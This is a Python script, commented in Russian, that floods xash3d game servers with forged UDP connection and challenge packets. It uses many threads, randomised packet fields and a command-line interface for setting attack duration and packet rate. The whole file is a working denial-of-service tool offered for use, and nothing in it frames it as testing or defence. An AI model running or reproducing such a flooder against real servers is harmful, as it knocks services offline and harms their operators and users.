#!/usr/bin/env python3
"""
Мощный флуд серверов xash3d
Генерирует максимальное количество запросов подключения
"""

import socket
import struct
import time
import random
import threading
import sys
import socket
import os

# Константы протокола
OOB_HEADER = b"\xff\xff\xff\xff"
PROTOCOL_VERSION = 49

class XashFlooder:
    def __init__(self, target_ip, target_port, threads=100, duration=60):
        self.target_ip = target_ip
        self.target_port = target_port
        self.threads = threads
        self.duration = duration
        self.packets_sent = 0
        self.running = True
        
    def generate_connect_packet(self):
        """Генерирует быстрый пакет подключения"""
        # Случайные данные для каждого пакета
        challenge = random.randint(1000000, 9999999)
        qport = random.randint(1, 65535)
        
        # Упрощенные строки без сложного экранирования
        protinfo = f"\\uuid\\{random.randint(1000000, 9999999)}\\qport\\{qport}\\ext\\1"
        nickname = f"Flood_{random.randint(1000, 9999)}"
        userinfo = f"\\name\\{nickname}"
        
        # Простой формат пакета
        connect_data = f"connect {PROTOCOL_VERSION} {challenge} \"{protinfo}\" \"{userinfo}\"\n"
        return OOB_HEADER + connect_data.encode('utf-8')
    
    def generate_getchallenge_packet(self):
        """Генерирует пакет запроса challenge"""
        return OOB_HEADER + b"getchallenge steam\n"
    
    def flood_thread(self, thread_id):
        """Поток для отправки запросов"""
        local_packets = 0
        
        # Создаем RAW сокет для максимальной производительности
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
            
            # Уменьшаем таймауты
            sock.settimeout(0.01)
            
            # Увеличиваем буферы
            sock.setsockopt(socket.SOL_SOCKET, socket.SO_SNDBUF, 1024 * 1024)
            sock.setsockopt(socket.SOL_SOCKET, socket.SO_RCVBUF, 1024 * 1024)
            
            # Отключаем проверки
            sock.setsockopt(socket.IPPROTO_IP, socket.IP_TOS, 0x08)  # Maximize throughput
            
        except:
            # Простой сокет если не получилось с настройками
            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            sock.settimeout(0.01)
        
        packet_types = [self.generate_connect_packet, self.generate_getchallenge_packet]
        
        while self.running:
            try:
                # Чередуем типы пакетов для разнообразия
                packet_func = random.choice(packet_types)
                packet = packet_func()
                
                # Отправляем несколько раз подряд
                for _ in range(random.randint(1, 5)):
                    sock.sendto(packet, (self.target_ip, self.target_port))
                    local_packets += 1
                    
                    # Иногда отправляем без OOB заголовка (инвалидные пакеты)
                    if random.random() < 0.1:
                        invalid_packet = packet[4:] if len(packet) > 4 else packet
                        sock.sendto(invalid_packet, (self.target_ip, self.target_port))
                        local_packets += 1
                
                # Небольшая пауза чтобы не забить очередь отправки
                if random.random() < 0.3:
                    time.sleep(0.001)
                    
            except:
                # Игнорируем все ошибки, продолжаем флудить
                try:
                    sock.close()
                except:
                    pass
                
                # Создаем новый сокет
                try:
                    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                    sock.settimeout(0.01)
                except:
                    time.sleep(0.1)
        
        try:
            sock.close()
        except:
            pass
        
        # Обновляем общий счетчик
        self.packets_sent += local_packets
        return local_packets
    
    def start(self):
        """Запускает флуд"""
        print(f"[+] Начинаем флуд {self.target_ip}:{self.target_port}")
        print(f"[+] Потоки: {self.threads}")
        print(f"[+] Длительность: {self.duration} секунд")
        print("-" * 50)
        
        start_time = time.time()
        threads = []
        
        # Запускаем потоки
        for i in range(self.threads):
            t = threading.Thread(target=self.flood_thread, args=(i,))
            t.daemon = True
            t.start()
            threads.append(t)
        
        # Мониторинг
        last_packets = 0
        last_time = start_time
        
        try:
            while time.time() - start_time < self.duration:
                current_time = time.time()
                elapsed = current_time - last_time
                
                if elapsed >= 1.0:  # Каждую секунду
                    current_packets = self.packets_sent
                    packets_per_sec = (current_packets - last_packets) / elapsed
                    
                    print(f"\r[+] Отправлено: {current_packets:,} пакетов | "
                          f"Скорость: {packets_per_sec:,.0f} pps", end="", flush=True)
                    
                    last_packets = current_packets
                    last_time = current_time
                
                time.sleep(0.1)
        
        except KeyboardInterrupt:
            print("\n[!] Прервано пользователем")
        
        # Останавливаем
        self.running = False
        
        # Ждем завершения потоков
        time.sleep(2)
        
        print(f"\n[+] Итог: отправлено {self.packets_sent:,} пакетов")
        print(f"[+] Средняя скорость: {self.packets_sent / self.duration:,.0f} pps")


def simple_flood(target_ip, target_port, packets_per_sec=1000, duration=30):
    """Упрощенный однопоточный флуд для максимальной производительности"""
    print(f"[+] Простой флуд {target_ip}:{target_port}")
    print(f"[+] Цель: {packets_per_sec:,} пакетов в секунду")
    print(f"[+] Длительность: {duration} секунд")
    print("-" * 50)
    
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    
    # Настройки для максимальной производительности
    sock.setsockopt(socket.SOL_SOCKET, socket.SO_SNDBUF, 1024 * 1024)
    
    packets_sent = 0
    start_time = time.time()
    
    # Предварительно генерируем несколько шаблонов пакетов
    packet_templates = []
    for _ in range(100):
        challenge = random.randint(1000000, 9999999)
        qport = random.randint(1, 65535)
        protinfo = f"\\uuid\\{random.randint(1000000, 9999999)}\\qport\\{qport}\\ext\\1"
        nickname = f"F{random.randint(10000, 99999)}"
        userinfo = f"\\name\\{nickname}"
        connect_data = f"connect {PROTOCOL_VERSION} {challenge} \"{protinfo}\" \"{userinfo}\"\n"
        packet_templates.append(OOB_HEADER + connect_data.encode('utf-8'))
    
    try:
        while time.time() - start_time < duration:
            batch_start = time.time()
            batch_packets = 0
            
            # Отправляем пачку пакетов
            while batch_packets < packets_per_sec and time.time() - batch_start < 1.0:
                # Берем случайный шаблон
                packet = random.choice(packet_templates)
                
                # Отправляем несколько копий
                for _ in range(min(10, packets_per_sec - batch_packets)):
                    try:
                        sock.sendto(packet, (target_ip, target_port))
                        packets_sent += 1
                        batch_packets += 1
                    except:
                        pass
            
            # Задержка до конца секунды
            elapsed = time.time() - batch_start
            if elapsed < 1.0:
                time.sleep(1.0 - elapsed)
            
            print(f"\r[+] Отправлено: {packets_sent:,} пакетов | "
                  f"Скорость: {batch_packets:,.0f} pps", end="", flush=True)
    
    except KeyboardInterrupt:
        print("\n[!] Прервано")
    
    sock.close()
    print(f"\n[+] Итог: отправлено {packets_sent:,} пакетов")
    print(f"[+] Средняя скорость: {packets_sent / (time.time() - start_time):,.0f} pps")


def main():
    """Главная функция"""
    if len(sys.argv) < 3:
        print("Использование: python xash_flood.py <IP> <PORT> [опции]")
        print()
        print("Опции:")
        print("  -t <число>    Количество потоков (по умолчанию: 50)")
        print("  -d <секунды>  Длительность атаки (по умолчанию: 60)")
        print("  -s            Простой режим (максимальная производительность)")
        print("  -pps <число>  Целевое количество пакетов в секунду (для простого режима)")
        print()
        print("Примеры:")
        print("  python xash_flood.py 192.168.1.100 27015")
        print("  python xash_flood.py 192.168.1.100 27015 -t 100 -d 120")
        print("  python xash_flood.py 192.168.1.100 27015 -s -pps 5000")
        return
    
    target_ip = sys.argv[1]
    target_port = int(sys.argv[2])
    
    # Парсинг аргументов
    threads = 50
    duration = 60
    simple_mode = False
    pps = 1000
    
    i = 3
    while i < len(sys.argv):
        arg = sys.argv[i]
        
        if arg == "-t" and i + 1 < len(sys.argv):
            threads = int(sys.argv[i + 1])
            i += 2
        elif arg == "-d" and i + 1 < len(sys.argv):
            duration = int(sys.argv[i + 1])
            i += 2
        elif arg == "-s":
            simple_mode = True
            i += 1
        elif arg == "-pps" and i + 1 < len(sys.argv):
            pps = int(sys.argv[i + 1])
            i += 2
        else:
            i += 1
    
    try:
        if simple_mode:
            simple_flood(target_ip, target_port, pps, duration)
        else:
            flooder = XashFlooder(target_ip, target_port, threads, duration)
            flooder.start()
    except KeyboardInterrupt:
        print("\n[!] Выход")
    except Exception as e:
        print(f"[!] Ошибка: {e}")


if __name__ == "__main__":
    # Увеличиваем лимиты
    try:
        import resource
        resource.setrlimit(resource.RLIMIT_NOFILE, (65536, 65536))
    except:
        pass
    
    # Устанавливаем высокий приоритет
    try:
        os.nice(-20)
    except:
        pass
    
    main()